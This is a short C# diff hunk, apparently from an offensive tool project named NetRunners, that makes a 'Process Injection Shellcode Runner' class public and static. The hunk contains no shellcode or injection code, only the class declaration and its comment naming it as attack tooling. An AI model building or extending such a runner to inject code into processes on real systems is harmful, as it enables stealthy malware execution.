@@ -10,7 +10,7 @@ namespace NetRunners.Runners
     /// <summary>
     /// This class contains the Process Injection Shellcode Runner
     /// </summary>
-    class PiRunner
+    public static class PiRunner
     {
         // Process Injection Runner
         public static void Run()
